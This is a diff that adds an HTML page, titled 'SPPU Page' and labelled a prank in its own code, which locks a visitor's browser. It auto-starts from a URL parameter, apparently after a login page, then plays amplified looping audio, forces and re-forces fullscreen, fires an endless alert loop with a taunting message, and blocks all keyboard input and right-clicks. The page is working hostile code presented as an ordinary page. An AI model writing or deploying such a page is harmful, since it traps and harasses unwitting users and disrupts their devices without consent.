@@ -1,1 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SPPU Page</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <audio id="audio1" preload="auto">
+        <source src="video/ReelAudio.mp3" type="audio/mp3">
+    </audio>
+    <audio id="audio2" preload="auto">
+        <source src="video/ReelAudio.mp3" type="audio/mp3">
+    </audio>
 
+    <script>
+        const audio1 = document.getElementById('audio1');
+        const audio2 = document.getElementById('audio2');
+        let hasStarted = false;
+
+        function startPrank() {
+            if (hasStarted) return;
+            hasStarted = true;
+
+            try {
+                // Initialize audio context
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                
+                // Setup both audio elements
+                [audio1, audio2].forEach(audio => {
+                    const source = audioContext.createMediaElementSource(audio);
+                    const gainNode = audioContext.createGain();
+                    gainNode.gain.value = 2.0;
+                    source.connect(gainNode).connect(audioContext.destination);
+                    audio.loop = true;
+                });
+
+                // Start playing with offset
+                audio1.play();
+                setTimeout(() => {
+                    audio2.play();
+                    audio2.currentTime = audio1.duration / 2;
+                }, 100);
+
+                // Force fullscreen
+                const elem = document.documentElement;
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen();
+                } else if (elem.webkitRequestFullscreen) {
+                    elem.webkitRequestFullscreen();
+                }
+
+                // Start alert loop
+                function loopAlert() {
+                    alert("rss paylaa ye mhntl mayy");
+                    requestAnimationFrame(loopAlert);
+                }
+                setTimeout(loopAlert, 100);
+
+            } catch (err) {
+                console.error("Error:", err);
+            }
+        }
+
+        // Auto start if coming from login page
+        window.addEventListener('DOMContentLoaded', () => {
+            const params = new URLSearchParams(window.location.search);
+            if (params.get('autostart') === 'true') {
+                startPrank();
+            }
+        });
+
+        // Prevent escape from fullscreen
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            }
+        });
+
+        // Keep audio playing
+        [audio1, audio2].forEach(audio => {
+            audio.addEventListener('pause', () => audio.play());
+        });
+
+        // Block keyboard shortcuts
+        document.addEventListener('keydown', e => e.preventDefault());
+
+        // Block right-click
+        document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
+</body>
+</html>
